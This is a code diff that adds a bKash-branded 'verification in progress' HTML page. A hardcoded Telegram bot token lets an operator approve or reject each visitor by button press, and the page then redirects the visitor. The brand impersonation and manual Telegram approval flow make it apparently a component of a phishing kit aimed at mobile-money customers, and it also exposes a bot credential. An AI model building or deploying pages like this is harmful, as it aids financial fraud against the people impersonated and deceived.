@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processing...</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .spinner {
+            border: 4px solid #f3f4f6;
+            border-top: 4px solid #E2136E;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-sm text-center">
+        
+        <img src="img/bKash-logo.png" alt="bKash" class="h-8 mx-auto mb-6">
+
+        <div id="statusBox">
+            <div class="spinner mx-auto mb-4"></div>
+            <h2 class="text-xl font-bold text-gray-800">যাচাই করা হচ্ছে...</h2>
+            <p class="text-sm text-gray-500 mt-2">আপনার আবেদনটি এডমিন রিভিউতে আছে। অনুগ্রহ করে অপেক্ষা করুন।</p>
+            <p class="text-xs text-pink-600 font-bold mt-4 animate-pulse">Waiting for Approval...</p>
+            <p class="text-xs text-gray-400 mt-2">Do not close this page.</p>
+        </div>
+
+    </div>
+
+    <script>
+        // ==================================================
+        // ⚠️ আপনার বটের টোকেন নিচে বসান ⚠️
+        // ==================================================
+        const botToken = "8219251554:AAF6qEcHBVoofOCdj4JRqAycz3RxvIqsnqI"; 
+
+        // পেজ লোড হওয়ার সময় রেকর্ড করা (যাতে পুরানো বাটন ক্লিকে কাজ না করে)
+        const startTime = Math.floor(Date.now() / 1000);
+
+        function checkTelegramUpdates() {
+            // টেলিগ্রাম থেকে আপডেট চেক করা
+            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=-1`)
+            .then(response => response.json())
+            .then(data => {
+                if (data.result && data.result.length > 0) {
+                    // একদম শেষের আপডেটটি নেওয়া
+                    const lastUpdate = data.result[data.result.length - 1];
+
+                    // চেক করা বাটন (Callback Query) চাপা হয়েছে কিনা
+                    if (lastUpdate.callback_query) {
+                        const action = lastUpdate.callback_query.data;
+                        const clickTime = lastUpdate.callback_query.message.date;
+
+                        // লজিক: বাটন চাপার সময় যদি পেজ লোড হওয়ার সময়ের পরে হয়
+                        if (clickTime >= startTime) {
+                            handleAction(action);
+                        }
+                    }
+                }
+            })
+            .catch(error => console.log("Checking for admin action..."));
+        }
+
+        function handleAction(action) {
+            const statusBox = document.getElementById('statusBox');
+
+            if (action === "approve") {
+                // ১. যদি Approve বাটন চাপেন
+                statusBox.innerHTML = `
+                    <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                        <svg class="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                    </div>
+                    <h2 class="text-xl font-bold text-green-600">অনুমোদিত!</h2>
+                    <p class="text-sm text-gray-500">আপনাকে পরবর্তী ধাপে নেওয়া হচ্ছে...</p>
+                `;
+                // ২ সেকেন্ড পর Success পেজে রিডাইরেক্ট
+                setTimeout(() => window.location.href = "success.html", 2000);
+            
+            } else if (action === "reject") {
+                // ২. যদি Reject বাটন চাপেন
+                statusBox.innerHTML = `
+                    <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                        <svg class="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+                    </div>
+                    <h2 class="text-xl font-bold text-red-600">বাতিল!</h2>
+                    <p class="text-sm text-gray-500">আপনার আবেদনটি গ্রহণ করা হয়নি।</p>
+                `;
+                // ২ সেকেন্ড পর Failed পেজে রিডাইরেক্ট
+                setTimeout(() => window.location.href = "index.html", 2000);
+            }
+        }
+
+        // প্রতি ৩ সেকেন্ড পর পর চেক করবে
+        setInterval(checkTelegramUpdates, 3000);
+
+    </script>
+</body>
+</html>
